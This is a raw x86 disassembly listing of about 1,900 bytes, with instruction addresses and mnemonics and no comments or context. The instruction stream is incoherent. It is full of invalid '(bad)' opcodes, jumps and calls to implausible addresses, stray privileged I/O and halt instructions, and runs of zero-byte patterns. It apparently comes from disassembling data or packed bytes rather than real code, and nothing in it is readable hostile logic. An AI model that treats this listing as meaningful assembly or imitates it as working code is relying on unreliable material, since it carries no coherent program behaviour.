  412974:	fmul   QWORD PTR [edi-0x2fe251f]
  41297a:	loopne 0x4129bf
  41297c:	fadd   QWORD PTR [edi-0x76fe252f]
  412982:	xor    ecx,DWORD PTR [ebp+0x193c594a]
  412988:	add    BYTE PTR [eax],al
  41298a:	mov    ds:0x72f87ea4,eax
  41298f:	dec    esp
  412990:	add    DWORD PTR [edx+0x73],ebp
  412993:	add    DWORD PTR [eax+edx*2],0x1619ee32
  41299a:	mov    ch,0xdb
  41299c:	jle    0x41298e
  41299e:	mul    ah
  4129a0:	jmp    0xf666:0xc1a8b674
  4129a7:	xchg   ebx,eax
  4129a8:	add    ecx,DWORD PTR ds:0x81399ae0
  4129ae:	adc    eax,0x59c086cf
  4129b3:	sub    edx,DWORD PTR [ecx+0x56]
  4129b6:	repnz in eax,dx
  4129b8:	sbb    eax,0x80db3516
  4129bd:	shr    BYTE PTR [eax-0x2a],0x5b
  4129c1:	inc    DWORD PTR [eax-0x54]
  4129c4:	adc    BYTE PTR [eax+eax*1],bh
  4129c7:	add    BYTE PTR [eax],al
  4129c9:	add    BYTE PTR [eax],al
  4129cb:	imul   ebx,DWORD PTR [ebx],0x4
  4129ce:	xor    DWORD PTR [ebp+0x68fd0b06],0xffffff97
  4129d5:	adc    BYTE PTR [eax+0x75],al
  4129d8:	and    eax,0xedb2f87d
  4129dd:	sub    eax,0x52db3516
  4129e2:	std    
  4129e3:	mov    BYTE PTR [ebx+0x5875400f],ch
  4129e9:	mov    bh,0xfd
  4129eb:	xor    ah,BYTE PTR [eax-0x41]
  4129ee:	pop    esi
  4129ef:	mov    dh,0x1
  4129f1:	mov    esp,0x6b1e1178
  4129f6:	test   BYTE PTR [ecx+0x7503ec11],cl
  4129fc:	dec    esp
  4129fd:	mov    dh,0x7e
  4129ff:	scas   al,BYTE PTR es:[edi]
  412a00:	rcr    ah,cl
  412a02:	inc    ebx
  412a03:	jne    0x412a34
  412a05:	xor    eax,0xbc79d6de
  412a0a:	jae    0x412996
  412a0c:	lods   eax,DWORD PTR ds:[esi]
  412a0d:	ret    
  412a0e:	jmp    0x3dec:0x4d9de448
  412a15:	xchg   edi,eax
  412a16:	jle    0x412a09
  412a18:	jge    0x412a99
  412a1a:	jmp    0xfaa6:0xc6d2e430
  412a21:	jno    0x412a5b
  412a23:	mov    eax,ds:0xc57ac79
  412a28:	add    BYTE PTR [eax+0x48],ah
  412a2b:	mov    eax,ds:0x37f4c
  412a30:	add    BYTE PTR [eax],al
  412a32:	add    BYTE PTR [eax],al
  412a34:	jno    0x412a38
  412a36:	out    0x76,eax
  412a38:	out    dx,al
  412a39:	pop    esi
  412a3a:	loop   0x412a25
  412a3c:	clc    
  412a3d:	push   ecx
  412a3e:	aaa    
  412a3f:	jmp    0x44364cca
  412a44:	jne    0x412abf
  412a46:	sub    al,0x5c
  412a48:	hlt    
  412a49:	jmp    0x7717:0x4c4167e8
  412a50:	neg    BYTE PTR [esi-0x4e]
  412a53:	jmp    0x6fe77d20
  412a58:	push   ecx
  412a59:	jecxz  0x412a4f
  412a5b:	sub    esp,DWORD PTR [ebx+0x42]
  412a5e:	out    0x2c,eax
  412a60:	ss pop edx
  412a62:	adc    al,0x27
  412a64:	test   al,0x3d
  412a66:	idiv   DWORD PTR [esi+esi*1+0x72]
  412a6a:	ret    0x117e
  412a6d:	jecxz  0x412a6f
  412a6f:	jbe    0x412a0d
  412a71:	jo     0x412a19
  412a73:	bound  ecx,QWORD PTR [edx+0x66]
  412a76:	push   esi
  412a77:	mov    edi,0x5e6c7eff
  412a7c:	mov    ebp,fs
  412a7e:	push   esi
  412a7f:	fs repnz pop esi
  412a82:	std    
  412a83:	dec    esi
  412a84:	pop    esp
  412a85:	push   edx
  412a86:	push   esi
  412a87:	cs loop 0x412ae8
  412a8a:	std    
  412a8b:	ds dec esp
  412a8d:	add    BYTE PTR [eax],al
  412a8f:	jmp    0xc1dca60a
  412a94:	pop    ebp
  412a95:	in     eax,0xfd
  412a97:	add    BYTE PTR es:[eax],al
  412a9a:	add    BYTE PTR [eax],al
  412a9c:	add    BYTE PTR [ecx+eax*4],ah
  412a9f:	clc    
  412aa0:	call   0x16ada2e2
  412aa5:	sbb    al,0xe5
  412aa7:	pop    ebp
  412aa8:	scas   eax,DWORD PTR es:[edi]
  412aa9:	icebp  
  412aaa:	mov    esi,0xfe3b3074
  412aaf:	call   DWORD PTR [ebx+0x57fd699]
  412ab5:	or     eax,0xa1e9fde4
  412aba:	jns    0x412b17
  412abc:	icebp  
  412abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412abe:	jns    0x412ab0
  412ac0:	jb     0x412afd
  412ac2:	test   BYTE PTR [edx-0x87e89d9],0x29
  412ac9:	pusha  
  412aca:	imul   eax,DWORD PTR [ebx+0x310a52a9],0xffffff9b
  412ad1:	or     edx,ebx
  412ad3:	add    ecx,ebp
  412ad5:	jbe    0x412ac4
  412ad7:	icebp  
  412ad8:	bound  esi,QWORD PTR [ebx]
  412ada:	cli    
  412adb:	mov    bx,0x9e
  412adf:	add    cl,ch
  412ae1:	aas    
  412ae2:	aas    
  412ae3:	clc    
  412ae4:	pusha  
  412ae5:	inc    ebx
  412ae6:	out    0x6a,al
  412ae8:	in     eax,0x41
  412aea:	ja     0x412a6f
  412aec:	add    ah,dh
  412aee:	fdivr  st,st(3)
  412af0:	(bad)  
  412af1:	jl     0x412b5a
  412af3:	mov    esp,esi
  412af5:	or     bl,dl
  412af7:	sti    
  412af8:	call   0x3e7064
  412afd:	adc    ecx,esi
  412aff:	je     0x412b16
  412b01:	add    BYTE PTR [eax],al
  412b03:	add    BYTE PTR [eax],al
  412b05:	add    BYTE PTR [edi],al
  412b07:	sar    DWORD PTR [ebp-0x4c9a120],0x75
  412b0e:	ins    BYTE PTR es:[edi],dx
  412b0f:	pop    ecx
  412b10:	cmp    esp,0x50fbeaba
  412b16:	les    eax,FWORD PTR [edi+0x67]
  412b19:	add    DWORD PTR [edi+edx*1-0x40],ebx
  412b1d:	cmp    edx,DWORD PTR [ecx]
  412b1f:	fimul  DWORD PTR [edx-0x3ff16bb3]
  412b25:	and    ecx,DWORD PTR [ebp-0x9ff95cb]
  412b2b:	add    eax,0xeb808589
  412b30:	sti    
  412b31:	(bad)  
  412b32:	cld    
  412b33:	aas    
  412b34:	add    bh,bh
  412b36:	inc    ecx
  412b37:	mov    dh,0x11
  412b39:	inc    eax
  412b3a:	sbb    al,0x61
  412b3c:	shl    BYTE PTR [ebp+0x20],0x3e
  412b40:	dec    esp
  412b41:	daa    
  412b42:	or     al,0x6
  412b44:	sti    
  412b45:	adc    eax,0x40105c
  412b4a:	pop    edi
  412b4b:	sahf   
  412b4c:	sti    
  412b4d:	pop    esi
  412b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b4f:	lahf   
  412b50:	ret    0xcc0c
  412b53:	test   al,bh
  412b55:	jmp    DWORD PTR [eax+0xbf62fd4]
  412b5b:	adc    ebp,DWORD PTR [edi-0x12dae73]
  412b61:	call   FWORD PTR [ebx]
  412b63:	mov    edi,0xe9dbfc39
  412b68:	test   al,al
  412b6a:	add    BYTE PTR [eax],al
  412b6c:	add    BYTE PTR [eax],al
  412b6e:	add    BYTE PTR [ebp-0x2],dh
  412b71:	sti    
  412b72:	inc    ebp
  412b73:	not    BYTE PTR [ecx+0x748d7203]
  412b79:	into   
  412b7a:	mov    DWORD PTR [ecx+0x1c],esi
  412b7d:	(bad)  
  412b7f:	sub    BYTE PTR [eax+ebx*8-0x3],ah
  412b83:	add    BYTE PTR [edi-0x14f03fce],bh
  412b89:	out    0x73,al
  412b8b:	ins    DWORD PTR es:[edi],dx
  412b8c:	stos   DWORD PTR es:[edi],eax
  412b8d:	fldcw  WORD PTR [edx]
  412b8f:	jb     0x412bc9
  412b91:	in     eax,0x81
  412b93:	ins    DWORD PTR es:[edi],dx
  412b94:	push   eax
  412b95:	jo     0x412bab
  412b97:	lock xchg ebp,eax
  412b99:	cmc    
  412b9a:	dec    esi
  412b9b:	iret   
  412b9c:	jmp    0x412bef
  412b9e:	lds    edi,FWORD PTR [eax+0x750081e7]
  412ba4:	jmp    0x412b8c
  412ba6:	adc    esi,DWORD PTR [ebp-0x67ffbe1f]
  412bac:	sub    eax,0xf8f7fffc
  412bb1:	in     al,0x74
  412bb3:	test   DWORD PTR [ebp-0x41ddaa01],eax
  412bb9:	or     DWORD PTR [esi],edx
  412bbb:	mov    ch,0xeb
  412bbd:	dec    ebx
  412bbe:	std    
  412bbf:	push   0x75400b9f
  412bc4:	sub    al,0xf5
  412bc6:	mov    ah,0x7b
  412bc8:	and    BYTE PTR [edx+0xf],bl
  412bcb:	(bad)  
  412bcc:	in     eax,dx
  412bcd:	push   ecx
  412bce:	std    
  412bcf:	mov    BYTE PTR [ebx],al
  412bd1:	push   cs
  412bd2:	inc    eax
  412bd3:	add    BYTE PTR [eax],al
  412bd5:	add    BYTE PTR [eax],al
  412bd7:	add    BYTE PTR [ebp+0x64],dh
  412bda:	jmp    0x6e090e60
  412bdf:	and    eax,0x815baba6
  412be4:	xchg   ebx,eax
  412be5:	in     eax,dx
  412be6:	not    BYTE PTR [edx-0x1f7edd4b]
  412bec:	leave  
  412bed:	add    DWORD PTR [edx-0x3d],ebp
  412bf0:	pop    ecx
  412bf1:	xor    dh,BYTE PTR ds:0xcaf6b04f
  412bf7:	or     eax,0xc3640235
  412bfc:	sub    DWORD PTR [esi+ebx*1],ecx
  412bff:	out    0x86,eax
  412c01:	push   ss
  412c02:	aad    0x43
  412c04:	jne    0x412b8b
  412c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c07:	out    0xfc,al
  412c09:	enter  0xc30e,0x26
  412c0d:	lea    edx,[ebx-0x7e]
  412c10:	xchg   ecx,eax
  412c11:	fldcw  WORD PTR [edx-0x29]
  412c14:	fnstenv [ebx]
  412c16:	(bad)  
  412c17:	leave  
  412c18:	push   0xdc83db44
  412c1d:	or     ch,al
  412c1f:	jp     0x412bd5
  412c21:	push   cs
  412c22:	xchg   ebp,eax
  412c23:	dec    esi
  412c24:	cld    
  412c25:	sar    DWORD PTR [eax+edi*8+0x6dc3daf5],1
  412c2c:	ins    DWORD PTR es:[edi],dx
  412c2d:	ins    BYTE PTR es:[edi],dx
  412c2e:	jmp    0xe8247e7e
  412c33:	add    esi,DWORD PTR [ebp+0x6c]
  412c36:	jecxz  0x412cb0
  412c38:	test   eax,0x4bc726
  412c3d:	add    BYTE PTR [eax],al
  412c3f:	add    BYTE PTR [eax],al
  412c41:	or     eax,0x7502f707
  412c46:	cmp    BYTE PTR [edx-0x42],dh
  412c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c4a:	ins    BYTE PTR es:[edi],dx
  412c4b:	test   eax,0xc356fe46
  412c50:	xor    ecx,DWORD PTR ds:0x75034069
  412c56:	cmp    DWORD PTR [eax+0x7f],eax
  412c59:	mov    ch,0x5f
  412c5b:	fbstp  TBYTE PTR [eax]
  412c5d:	mov    ch,0x42
  412c5f:	shr    BYTE PTR [esi+0x30e70275],0xd8
  412c66:	inc    edi
  412c67:	push   ss
  412c68:	ja     0x412ca3
  412c6a:	add    BYTE PTR es:0x5cf61121,al
  412c71:	xor    eax,0x3e392426
  412c76:	push   esi
  412c77:	and    al,0xd1
  412c79:	das    
  412c7a:	push   esi
  412c7b:	and    al,0xc5
  412c7d:	das    
  412c7e:	push   esi
  412c7f:	and    al,0xd9
  412c81:	mov    esi,0x76e8be45
  412c86:	xchg   al,al
  412c88:	ins    BYTE PTR es:[edi],dx
  412c89:	xor    eax,0xae61c26
  412c8e:	test   BYTE PTR [eax],al
  412c90:	jmp    0xb9730a0b
  412c95:	add    eax,DWORD PTR [esi+0x24]
  412c98:	std    
  412c99:	dec    esi
  412c9a:	nop
  412c9b:	mov    esp,0xc08676e8
  412ca0:	aad    0xc8
  412ca2:	fnsave [ebp+ecx*1+0x0]
  412ca6:	add    BYTE PTR [eax],al
  412ca8:	add    BYTE PTR [eax],al
  412caa:	test   DWORD PTR [ecx-0x1582fabc],ecx
  412cb0:	ficomp WORD PTR [esi+esi*2]
  412cb3:	add    ah,BYTE PTR [edi]
  412cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cb6:	(bad)  
  412cb7:	cli    
  412cb8:	cmp    BYTE PTR [edi],ch
  412cba:	shl    DWORD PTR [edx],cl
  412cbc:	mov    DWORD PTR [ebp-0x3b96056e],esp
  412cc2:	gs mov ah,0x57
  412cc5:	push   ss
  412cc6:	es sbb esi,edx
  412cc9:	jl     0x412c82
  412ccb:	xchg   DWORD PTR [ebp+eax*8+0x66],esi
  412ccf:	sbb    esi,eax
  412cd1:	jg     0x412d45
  412cd3:	mov    DWORD PTR [ebp+eax*8+0x72],edi
  412cd7:	mov    eax,esi
  412cd9:	out    0x85,al
  412cdb:	push   es
  412cdc:	call   0xfe2095b3
  412ce1:	ins    DWORD PTR es:[edi],dx
  412ce2:	mov    dh,0x55
  412ce4:	add    al,0xce
  412ce6:	mov    ds:0x4f001026,al
  412ceb:	sahf   
  412cec:	sub    DWORD PTR [esi-0x77],ecx
  412cef:	mov    esp,0xf27874fb
  412cf4:	out    0x40,eax
  412cf6:	xor    eax,0x888d0003
  412cfb:	and    bl,BYTE PTR [eax+ebp*8]
  412cfe:	cs test eax,0xc2cffffd
  412d04:	xor    eax,0xaf2b874
  412d09:	xchg   esp,eax
  412d0a:	int3   
  412d0b:	mov    ecx,0xff14
  412d10:	add    BYTE PTR [eax],al
  412d12:	add    BYTE PTR [eax-0x4017ec02],cl
  412d18:	cmp    edi,ebp
  412d1a:	jmp    DWORD PTR [ecx]
  412d1c:	pop    ds
  412d1d:	and    al,0x1c
  412d1f:	and    al,0x70
  412d21:	mov    edx,0xc35b5c01
  412d26:	pop    edi
  412d27:	and    cl,BYTE PTR [ebx-0x79]
  412d2a:	in     eax,0x11
  412d2c:	ret    
  412d2d:	push   ecx
  412d2e:	mov    eax,eax
  412d30:	sub    ah,0x84
  412d33:	pop    edx
  412d34:	add    al,BYTE PTR [eax]
  412d36:	push   ebx
  412d37:	dec    edi
  412d38:	retf   
  412d39:	push   esi
  412d3a:	push   edi
  412d3b:	aad    0x44
  412d3d:	loopne 0x412cc8
  412d3f:	xor    DWORD PTR [esi+0x588c5d85],edi
  412d45:	pop    ecx
  412d46:	hlt    
  412d47:	xchg   ebp,eax
  412d48:	inc    esp
  412d49:	les    ecx,FWORD PTR [ecx+0x5d8599d1]
  412d4f:	js     0x412d7b
  412d51:	mov    edi,0x8bd6e274
  412d56:	xchg   ebp,eax
  412d57:	sbb    al,0x2
  412d59:	add    BYTE PTR [ebx+0x167e0304],al
  412d5f:	(bad)  
  412d60:	mov    esi,0x89590eff
  412d65:	add    BYTE PTR [eax],al
  412d67:	jne    0x412d54
  412d69:	loop   0x412dde
  412d6b:	jno    0x412dab
  412d6d:	inc    edi
  412d6e:	lock int 0x1
  412d71:	(bad)  
  412d72:	call   edx
  412d74:	mov    al,0x5e
  412d76:	mov    DWORD PTR [eax],eax
  412d78:	add    BYTE PTR [eax],al
  412d7a:	add    BYTE PTR [eax],al
  412d7c:	cmp    bl,ah
  412d7e:	mov    es,WORD PTR [edi+0x79]
  412d81:	pusha  
  412d82:	mov    edx,DWORD PTR [eax-0x7efe148c]
  412d88:	lods   eax,DWORD PTR ds:[esi]
  412d89:	jmp    0x63f6c1a0
  412d8e:	inc    edi
  412d8f:	mov    ah,0xf0
  412d91:	es mov al,0x50
  412d94:	call   0xfc910197
  412d99:	cs mov al,0x87
  412d9c:	and    BYTE PTR [ebx],bl
  412d9e:	mov    ebx,DWORD PTR [ebx-0x43]
  412da1:	cmp    ecx,0x73
  412da4:	jne    0x412d91
  412da6:	out    dx,al
  412da7:	dec    ebx
  412da8:	add    BYTE PTR [esi-0x7c],bh
  412dab:	imul   DWORD PTR [edx+0x34]
  412dae:	in     al,dx
  412daf:	pop    ecx
  412db0:	dec    ecx
  412db1:	jmp    0xfddb:0x22188b01
  412db8:	push   edx
  412db9:	and    al,0x47
  412dbb:	call   0x431921
  412dc0:	lock push ebp
  412dc2:	jo     0x412dc1
  412dc4:	cmp    ah,BYTE PTR [esp+ebp*8]
  412dc7:	mov    ah,0x4
  412dc9:	jmp    0x8bca:0x60746a01
  412dd0:	mov    al,0xfb
  412dd2:	jmp    0x412d7d
  412dd4:	call   0x3ac22fc2
  412dd9:	into   
  412dda:	loop   0x412e27
  412ddc:	sbb    eax,0x68e45e
  412de1:	add    BYTE PTR [eax],al
  412de3:	add    BYTE PTR [eax],al
  412de5:	(bad)
  412de8:	add    al,ch
  412dea:	add    DWORD PTR [ebx+eax*4-0x16],ebp
  412dee:	(bad)  
  412df0:	ss inc ebp
  412df2:	(bad)  
  412df4:	xor    ecx,DWORD PTR [ebx-0x4e7918be]
  412dfa:	or     eax,0x46fe0551
  412dff:	mov    bh,0x33
  412e01:	cld    
  412e02:	inc    esi
  412e03:	fisttp WORD PTR [esi+0x36bf061d]
  412e09:	lods   al,BYTE PTR ds:[esi]
  412e0a:	add    edi,esp
  412e0c:	push   ss
  412e0d:	stos   DWORD PTR es:[edi],eax
  412e0e:	sbb    dl,BYTE PTR [eax+ebx*8]
  412e11:	es stc 
  412e13:	cmp    al,0xec
  412e15:	push   edx
  412e16:	push   0xffffffe8
  412e18:	add    ebx,DWORD PTR [eax+0x5aeb7756]
  412e1e:	push   0xffffffe8
  412e20:	add    esp,DWORD PTR [ebx]
  412e22:	jmp    0xc3b9:0xdc826bca
  412e29:	xchg   edx,eax
  412e2a:	mov    ah,0xe9
  412e2c:	add    esi,DWORD PTR [ebp-0x77]
  412e2f:	aam    0xbf
  412e31:	repnz push ebp
  412e33:	inc    ebx
  412e34:	jmp    0x412e82
  412e36:	jae    0x412e20
  412e38:	add    esi,edx
  412e3a:	inc    ebp
  412e3b:	add    DWORD PTR [esi-0x36171932],0xffffffb6
  412e42:	(bad)  
  412e44:	pusha  
  412e45:	jbe    0x412dce
  412e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e48:	xlat   BYTE PTR ds:[ebx]
  412e49:	add    BYTE PTR [eax],al
  412e4b:	add    BYTE PTR [eax],al
  412e4d:	add    BYTE PTR [eax+eax*1-0x6f],cl
  412e51:	or     ebp,ecx
  412e53:	mov    DWORD PTR [ebx+esi*4+0x1bff55f2],esp
  412e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e5b:	(bad)  
  412e5c:	ficom  WORD PTR [ecx+0x3e7005a]
  412e62:	cld    
  412e63:	cmp    eax,0xf72c6e0b
  412e68:	call   FWORD PTR [edi-0x4b]
  412e6b:	mov    edx,0x142a7487
  412e70:	jae    0x412e2b
  412e72:	test   BYTE PTR [esp+ebp*1-0x76fd8915],cl
  412e79:	sub    al,0x71
  412e7b:	mov    DWORD PTR [eax-0x1b],eax
  412e7e:	into   
  412e7f:	adc    cl,ah
  412e81:	jmp    0xef01b4fc
  412e86:	repnz repz add ecx,ebp
  412e8a:	jbe    0x412e15
  412e8c:	jnp    0x412e2b
  412e8e:	jo     0x412ee7
  412e90:	lock jo 0x412edd
  412e93:	fiadd  DWORD PTR [edi+0x7313dd1c]
  412e99:	test   DWORD PTR [edi],edi
  412e9b:	and    eax,0x68b51489
  412ea0:	adc    al,0x74
  412ea2:	cmp    al,0xa
  412ea4:	push   esi
  412ea5:	sbb    DWORD PTR [edi+ebp*8+0x236df57],edx
  412eac:	and    DWORD PTR [ebp-0x223f809b],0x0
  412eb6:	add    BYTE PTR [ebp+ebx*8+0x3ef86143],al
  412ebd:	clc    
  412ebe:	push   0x2f
  412ec0:	idiv   BYTE PTR [eax]
  412ec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ec3:	dec    edx
  412ec4:	push   eax
  412ec5:	fdivp  st(2),st
  412ec7:	sub    al,0x89
  412ec9:	inc    ebx
  412eca:	dec    ebp
  412ecb:	outs   dx,BYTE PTR ds:[esi]
  412ecc:	aas    
  412ecd:	clc    
  412ece:	out    0xfb,al
  412ed0:	mov    edi,0x1776e8ff
  412ed5:	xchg   esi,eax
  412ed6:	jmp    0x6a4e3151
  412edb:	cmp    ebx,ebx
  412edd:	std    
  412ede:	jmp    0x5c5577d6
  412ee3:	ret    0xe8be
  412ee6:	add    BYTE PTR [ebp-0x6f000298],ah
  412eec:	(bad)  
  412eed:	je     0x412f0d
  412eef:	not    dl
  412ef1:	mov    al,BYTE PTR [edi+0x14]
  412ef4:	ja     0xbf46e73f
  412efa:	push   eax
  412efb:	retf   
  412efc:	ror    DWORD PTR [ecx+0x16],cl
  412eff:	mov    WORD PTR [esi],es
  412f01:	jg     0x412ec7
  412f03:	mov    eax,0x5fec41e1
  412f08:	(bad)  
  412f09:	adc    al,0x89
  412f0b:	imul   ebx,DWORD PTR [esi+0x15d45f89],0x87ac7589
  412f15:	pop    ecx
  412f16:	test   al,0x4
  412f18:	pop    edx
  412f19:	mov    es,WORD PTR [ecx]
  412f1b:	add    BYTE PTR [eax],al
  412f1d:	add    BYTE PTR [eax],al
  412f1f:	add    BYTE PTR [ebx+eax*4+0x51150fc0],bl
  412f26:	std    
  412f27:	dec    DWORD PTR [ebp+edx*1+0x2c4ae8]
  412f2e:	add    BYTE PTR [esp+ebx*8-0x729f7f0f],al
  412f35:	(bad)  
  412f36:	dec    DWORD PTR [edx-0x1731722d]
  412f3c:	bound  eax,QWORD PTR [edi-0x3a2f0003]
  412f42:	or     eax,DWORD PTR [ebp+0x51b]
  412f48:	iret   
  412f49:	dec    eax
  412f4a:	sar    bh,0xdf
  412f4d:	cmp    ah,ah
  412f4f:	xor    cl,BYTE PTR [eax]
  412f51:	sar    esp,1
  412f53:	jne    0x412f1d
  412f55:	xchg   BYTE PTR [edi-0x28bb118],bh
  412f5b:	jmp    DWORD PTR [ebp+0x5c85c040]
  412f61:	xacquire xchg DWORD PTR [eax],esi
  412f64:	jne    0x412f50
  412f66:	add    DWORD PTR [eax],eax
  412f68:	out    dx,al
  412f69:	sahf   
  412f6a:	or     DWORD PTR [ecx-0x4f73184b],ecx
  412f70:	cmc    
  412f71:	jmp    0x6ab1:0x9f020001
  412f78:	popa   
  412f79:	ss inc esi
  412f7b:	mov    BYTE PTR [esi+0x1b],al
  412f7e:	fst    QWORD PTR [ebx]
  412f80:	cmp    ecx,edx
  412f82:	inc    ecx
  412f83:	add    BYTE PTR [eax],al
  412f85:	add    BYTE PTR [eax],al
  412f87:	add    BYTE PTR [eax],al
  412f89:	mul    BYTE PTR [edi+0x45746a10]
  412f8f:	or     al,0x8b
  412f91:	cmp    BYTE PTR [edi+0x34],bl
  412f94:	call   0x45f7d2
  412f99:	dec    edi
  412f9a:	jmp    0x508c:0x1ee81c67
  412fa1:	pop    ds
  412fa2:	jmp    0x41300b
  412fa4:	add    BYTE PTR [edi],bl
  412fa6:	in     eax,dx
  412fa7:	mov    al,ch
  412fa9:	lea    ebx,[esi-0x3d]
  412fac:	call   FWORD PTR [edx-0x517c439c]
  412fb2:	rol    BYTE PTR [ebp+0x1eb75e3],1
  412fb8:	push   0x195dd
  412fbd:	jp     0x412f50
  412fbf:	jmp    0x22c6a29
  412fc4:	xchg   DWORD PTR [eax+0x74f88163],esi
  412fca:	scas   al,BYTE PTR es:[edi]
  412fcb:	or     eax,0x28436689
  412fd0:	js     0x413047
  412fd2:	jmp    0x412f5e
  412fd4:	inc    ebx
  412fd5:	dec    ebp
  412fd6:	xor    al,0x61
  412fd8:	mov    DWORD PTR [esi+0x653f8a9b],ebp
  412fde:	pop    esi
  412fdf:	les    esi,FWORD PTR [ebx+0x79]
  412fe2:	add    bl,dl
  412fe4:	aad    0x1c
  412fe6:	add    eax,0xea51546c
  412feb:	pop    eax
  412fec:	jo     0x412fee
  412fee:	add    BYTE PTR [eax],al
  412ff0:	add    BYTE PTR [eax],al
  412ff2:	sbb    bl,cl
  412ff4:	ficom  WORD PTR [esi+0x57fd7f35]
  412ffa:	dec    ecx
  412ffb:	ins    BYTE PTR es:[edi],dx
  412ffc:	int3   
  412ffd:	adc    ah,BYTE PTR [edi]
  412fff:	cmp    edi,esi
  413001:	aam    0xf6
  413003:	mov    bl,0x74
  413005:	adc    al,0x80
  413007:	xchg   ecx,eax
  413008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413009:	adc    dh,BYTE PTR [edx+0x64cc225f]
  41300f:	and    DWORD PTR [edx-0x23],esp
  413012:	repnz ds iret 
  413015:	nop
  413016:	push   es
  413017:	push   cs
  413018:	(bad)  
  413019:	fmulp  st(0),st
  41301b:	jmp    0xd903be89
  413020:	inc    ecx
  413021:	add    eax,0x505cbfec
  413026:	mov    ecx,0xaa8b20e9
  41302b:	fsubr  DWORD PTR [edx-0x3a]
  41302e:	dec    esi
  41302f:	fldenv [esp+ebx*8]
  413032:	es jecxz 0x413097
  413035:	pusha  
  413036:	(bad)  [edx+edi*2-0x18af3715]
  41303d:	add    eax,DWORD PTR [edx+eax*8+0x27]
  413041:	adc    eax,DWORD PTR [ebx-0xe3a4dc1]
  413047:	cmp    esi,DWORD PTR [edx+0x48]
  41304a:	jge    0x412fd7
  41304c:	scas   eax,DWORD PTR es:[edi]
  41304d:	pop    es
  41304e:	in     al,dx
  41304f:	mov    DWORD PTR [edi+0x4],esp
  413052:	jne    0x413056
  413054:	mov    ch,0x36
  413056:	add    BYTE PTR [eax],al
  413058:	add    BYTE PTR [eax],al
  41305a:	add    ah,bh
  41305c:	ror    BYTE PTR [edi+0x49],0xc9
  413060:	xlat   BYTE PTR ds:[ebx]
  413061:	mov    ch,BYTE PTR ds:[esi+0x336200c2]
  413068:	test   bh,al
  41306a:	mov    al,0x7f
  41306c:	xor    BYTE PTR [ebx+0x36eb16b4],cl
  413072:	jb     0x4130ed
  413074:	add    ch,cl
  413076:	loope  0x41307d
  413078:	cmp    al,0xe0
  41307a:	add    esp,edx
  41307c:	mov    edi,edi
  41307e:	call   0xc7b5f375
  413083:	out    dx,eax
  413084:	push   ebx
  413085:	or     al,0x2f
  413087:	lods   eax,DWORD PTR ds:[esi]
  413088:	aad    0xff
  41308a:	arpl   ax,cx
  41308c:	dec    esi
  41308d:	or     al,0xe6
  41308f:	inc    edx
  413090:	stos   BYTE PTR es:[edi],al
  413091:	call   0xfe1922ab
  413096:	ins    BYTE PTR es:[edi],dx
  413097:	mov    cl,0x4f
  413099:	or     eax,0xe8e2425c
  41309e:	pushf  
  41309f:	stc    
  4130a0:	xlat   BYTE PTR ds:[ebx]
  4130a1:	std    
  4130a2:	push   0x5a
  4130a4:	push   es
  4130a5:	add    BYTE PTR [esi+0xc89ae32],dh
  4130ab:	icebp  
  4130ac:	adc    esi,esi
  4130ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130af:	xor    ch,dl
  4130b1:	mov    DWORD PTR [ecx+edx*4],esp
  4130b4:	add    DWORD PTR [ebx-0x5b],0x95431979
  4130bb:	add    BYTE PTR [esi+0x84c9],0x0
  4130c2:	add    BYTE PTR [eax],al
  4130c4:	test   al,0xd5
  4130c6:	std    
  4130c7:	hlt    
  4130c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130c9:	jmp    0x1489:0x2760ca4
  4130d0:	adc    eax,0xfc314389
  4130d5:	dec    edx
  4130d6:	les    esi,FWORD PTR [eax-0x56]
  4130d9:	mov    cs,WORD PTR [ebx+0x683402bc]
  4130df:	test   al,0x1b
  4130e1:	inc    esp
  4130e2:	add    BYTE PTR [eax],al
  4130e4:	es sti 
  4130e6:	dec    edi
  4130e7:	push   ecx
  4130e8:	lds    eax,FWORD PTR [edi-0x10]
  4130eb:	mov    DWORD PTR [ecx],ecx
  4130ed:	scas   eax,DWORD PTR es:[edi]
  4130ee:	test   DWORD PTR [ebp+0x58],esi
  4130f1:	mov    esi,DWORD PTR [ecx-0x38]
  4130f4:	pop    edx
  4130f5:	aas    
  4130f6:	mov    eax,0x4b058401
  4130fb:	add    cl,BYTE PTR [edx+eax*4]
  4130fe:	les    edx,FWORD PTR [esp+ebx*4]
  413101:	aaa    
  413102:	sti    
  413103:	add    DWORD PTR [ebx],eax
  413105:	jg     0x41315e
  413107:	std    
  413108:	add    esi,DWORD PTR [esi-0x199f8a05]
  41310e:	pop    ebp
  41310f:	fld    QWORD PTR gs:[edx]
  413112:	push   esi
  413113:	call   0x3e904f
  413118:	ret    
  413119:	das    
  41311a:	lock call 0x3e90bf
  413120:	ret    
  413121:	das    
  413122:	loopne 0x41310c
  413124:	xchg   DWORD PTR [edi-0x3],ebx
  413127:	inc    DWORD PTR [eax]
  413129:	add    BYTE PTR [eax],al
  41312b:	add    BYTE PTR [eax],al
  41312d:	jne    0x41315e
  41312f:	aam    0xf
  413131:	and    eax,ebx
  413133:	pop    ebx
  413134:	pop    esi
  413135:	xchg   ebx,ecx
  413137:	ret    0x9c08
  41313a:	ja     0xf920412c
  413140:	xor    eax,0xffffffda
  413143:	push   eax
  413144:	push   ebp
  413145:	dec    edx
  413146:	or     eax,0xcff3f987
  41314b:	adc    eax,0x84fe4c13
  413150:	inc    esp
  413151:	test   al,0xd6
  413153:	mov    BYTE PTR [edi+0x58],al
  413156:	jnp    0x4130ec
  413158:	add    DWORD PTR [edx+eax*1-0x1],ebx
  41315c:	ret    0xb71c
  41315f:	adc    DWORD PTR [eax],ebx
  413161:	jne    0x41313c
  413163:	inc    ecx
  413164:	add    BYTE PTR [ebp+0x74],bl
  413167:	test   bh,bh
  413169:	dec    edx
  41316a:	push   ecx
  41316b:	shl    DWORD PTR [ecx],1
  41316d:	push   eax
  41316e:	add    ebp,edx
  413170:	jae    0x413116
